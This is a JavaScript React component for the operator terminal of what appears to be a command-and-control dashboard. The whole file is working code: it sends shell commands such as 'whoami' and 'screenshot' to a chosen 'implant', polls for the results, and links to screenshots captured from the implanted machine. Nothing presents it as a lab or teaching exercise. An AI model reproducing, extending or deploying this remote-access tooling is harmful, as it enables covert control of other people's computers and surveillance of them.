import React, { useEffect, useState, useRef } from "react";
// import ScreenshotViewer from './ScreenshotViewer'; // Import the new component

// API_BASE and CloseIcon remain the same from your provided code

const API_BASE = "/api";
const CloseIcon = () => (
  <svg
    xmlns="http://www.w3.org/2000/svg"
    fill="none"
    viewBox="0 0 24 24"
    strokeWidth={1.5}
    stroke="currentColor"
    className="w-5 h-5"
  >
    <path strokeLinecap="round" strokeLinejoin="round" d="M6 18L18 6M6 6l12 12" />
  </svg>
);

// New helper to extract screenshot path
const extractScreenshotPath = (output) => {
    // Example output from C2: "Screenshot saved to C2 server at: c2_screenshots/implant-token/file.png"
    // Example output from implant (if not processed by C2 yet or direct display): "screenshot_data:BASE64..."
    // Example error: "Screenshot failed: some error"
    if (typeof output !== 'string') return null;

    const c2PathMatch = output.match(/Screenshot saved to C2 server at: (c2_screenshots\/[a-zA-Z0-9_-]+\/[a-zA-Z0-9_.-]+\.png)/);
    if (c2PathMatch && c2PathMatch[1]) {
        return c2PathMatch[1];
    }
    // Could add more patterns here if screenshot data is handled differently in other cases
    return null;
};


export default function Terminal({ implantID, onClose, openScreenshotViewer }) { // Added openScreenshotViewer prop
  const [logs, setLogs] = useState([]);
  const [input, setInput] = useState("");
  const [loading, setLoading] = useState(false);
  const polling = useRef(true);
  const containerRef = useRef(null);
  // No need for ScreenshotViewer state here, it will be managed by Dashboard

  useEffect(() => {
    if (containerRef.current) {
      containerRef.current.scrollTop = containerRef.current.scrollHeight;
    }
  }, [logs]);

  useEffect(() => {
    polling.current = true;

    async function fetchLogs() {
      if (!polling.current) return;
      try {
        const token = localStorage.getItem("token");
        const res = await fetch(
          `${API_BASE}/implants/${implantID}/commands`,
          { headers: { Authorization: `Bearer ${token}` } }
        );
        if (!res.ok) {
          console.error(`Error fetching logs: ${res.status} ${res.statusText}`);
          if (res.status === 404) polling.current = false; // Stop if implant gone
          return;
        }
        const { commands } = await res.json();
        
        setLogs(prevLogs => {
            const serverCommands = commands.map(cmd => ({
                id: cmd.id,
                command: cmd.command,
                output: cmd.output || (cmd.status === 'pending' ? "…waiting for output…" : "<no output yet>"),
                status: cmd.status,
                isScreenshot: cmd.command === 'screenshot' && extractScreenshotPath(cmd.output) !== null,
                screenshotPath: cmd.command === 'screenshot' ? extractScreenshotPath(cmd.output) : null,
            }));

            const persistentOptimisticErrors = prevLogs.filter(log =>
                typeof log.id === 'string' && log.id.startsWith('optimistic-') && log.status === 'error' &&
                !serverCommands.some(sc => sc.command === log.command) 
            );
            
            const combinedLogs = [...serverCommands, ...persistentOptimisticErrors];
            
            return combinedLogs.sort((a, b) => {
                const aIsNum = typeof a.id === 'number';
                const bIsNum = typeof b.id === 'number';
                if (aIsNum && bIsNum) return a.id - b.id;
                if (aIsNum) return -1; 
                if (bIsNum) return 1;  
                return String(a.id).localeCompare(String(b.id)); 
            });
        });

      } catch (err) {
        console.error("Terminal fetch error:", err);
      }
    }
    fetchLogs();
    const intervalId = setInterval(fetchLogs, 2500); // Poll slightly more frequently
    return () => {
      polling.current = false;
      clearInterval(intervalId);
    };
  }, [implantID]);

  const sendCommand = async () => {
    if (!input.trim()) return;
    setLoading(true);
    const optimisticId = `optimistic-${Date.now()}`;
    const commandToSend = input;

    setLogs(prev => [
      ...prev,
      { id: optimisticId, command: commandToSend, output: "…sending command…", status: "pending", isScreenshot: commandToSend.toLowerCase() === 'screenshot' },
    ]);
    setInput("");

    try {
      const token = localStorage.getItem("token");
      const res = await fetch(`${API_BASE}/send-command`, {
        method: "POST",
        headers: { "Content-Type": "application/json", Authorization: `Bearer ${token}` },
        body: JSON.stringify({ implant_id: implantID, command: commandToSend }),
      });
      if (!res.ok) {
        const errorData = await res.json().catch(() => ({ error: "Failed to send command" }));
        const errorMessage = `Error: ${errorData.error || res.statusText}`;
        setLogs(prevLogs => prevLogs.map(log => 
            log.id === optimisticId ? {...log, output: errorMessage, status: "error"} : log
        ));
      }
      // Poller will update with actual result
    } catch (err) {
      const errorMessage = `Error: ${err.message || "Network error"}`;
      setLogs(prevLogs => prevLogs.map(log => 
          log.id === optimisticId ? {...log, output: errorMessage, status: "error"} : log
      ));
    } finally {
      setLoading(false);
    }
  };

  const handleClose = () => {
    polling.current = false;
    onClose();
  };
  
  const displayLogs = logs.map(log => {
    let outputDisplay = log.output;
    if (log.isScreenshot && log.screenshotPath) {
        outputDisplay = (
            <button
                onClick={() => openScreenshotViewer(implantID, log.screenshotPath)}
                className="text-blue-400 hover:text-blue-300 underline hover:no-underline transition-all"
            >
                View Screenshot: {log.screenshotPath.split('/').pop()}
            </button>
        );
    } else if (log.command === 'screenshot' && log.status === 'executed' && !log.screenshotPath) {
        // Handle cases where screenshot command was executed but no path was found (e.g., error message from C2)
        outputDisplay = <span className="text-yellow-400">{log.output || "Screenshot command processed, but no image path found."}</span>;
    } else if (log.status === 'pending' && (log.output === '…waiting for output…' || log.output === '…sending command…')) {
      outputDisplay = <span className="text-yellow-400 italic">{log.output}</span>;
    } else if (log.status === 'error') {
      outputDisplay = <span className="text-red-400">{log.output}</span>;
    } else if (log.output === "<no output yet>" || log.output === "<no output>") {
      outputDisplay = <span className="text-gray-500 italic">{log.output}</span>;
    }
    return { ...log, outputDisplay };
  });


  return (
    <>
      {/* ScreenshotViewer is now handled by Dashboard */}
      <div className="flex flex-col bg-gray-900 text-gray-100 rounded-xl shadow-2xl w-full max-w-3xl mx-auto h-[70vh] overflow-hidden">
        <div className="flex justify-between items-center bg-gray-800 px-4 py-3 border-b border-gray-700">
          <span className="font-semibold text-gray-300">Shell Access: {implantID}</span>
          <button onClick={handleClose} className="text-gray-500 hover:text-red-500 transition-colors" aria-label="Close terminal">
            <CloseIcon />
          </button>
        </div>
        <div
          ref={containerRef}
          className="flex-grow bg-black/80 text-sm p-4 overflow-y-auto space-y-3 font-mono scrollbar-thin scrollbar-thumb-gray-700 scrollbar-track-gray-800"
        >
          {displayLogs.length === 0 ? (
            <div className="text-gray-500 italic">No commands executed yet. Send 'screenshot' or other commands.</div>
          ) : (
            displayLogs.map((log) => (
              <div key={log.id}>
                <div className="flex items-baseline">
                  <span className="text-sky-400 mr-2 select-none">❯</span>
                  <pre className="whitespace-pre-wrap break-all text-gray-100">{log.command}</pre>
                </div>
                {(log.output || log.status === 'pending' || log.status === 'error' || log.isScreenshot) && (
                  <div className={`whitespace-pre-wrap break-words mt-1 pl-[calc(1ch + 0.5rem)] ${
                      log.status === 'error' ? 'text-red-400' : log.isScreenshot ? '' : 'text-gray-400' 
                  }`}>
                      {typeof log.outputDisplay === 'string' ? <pre>{log.outputDisplay}</pre> : log.outputDisplay}
                  </div>
                )}
              </div>
            ))
          )}
        </div>
        <form onSubmit={(e) => { e.preventDefault(); sendCommand(); }} className="flex items-center bg-gray-800 p-3 border-t border-gray-700">
          <span className="text-sky-400 mr-2 font-mono text-sm select-none">❯</span>
          <input
            type="text"
            className="flex-grow bg-transparent text-gray-100 placeholder-gray-500 focus:outline-none font-mono text-sm"
            placeholder="Enter command (e.g., screenshot, whoami)"
            value={input}
            onChange={(e) => setInput(e.target.value)}
            onKeyDown={(e) => { if (e.key === "Enter" && !e.shiftKey) { e.preventDefault(); sendCommand(); }}}
            disabled={loading}
            autoFocus
          />
          <button
            type="submit"
            disabled={loading || !input.trim()}
            className="bg-sky-600 hover:bg-sky-700 text-white px-4 py-1.5 rounded-md text-sm font-semibold transition-colors disabled:opacity-50 disabled:cursor-not-allowed ml-3"
          >
            {loading ? "Sending…" : "Send"}
          </button>
        </form>
      </div>
    </>
  );
}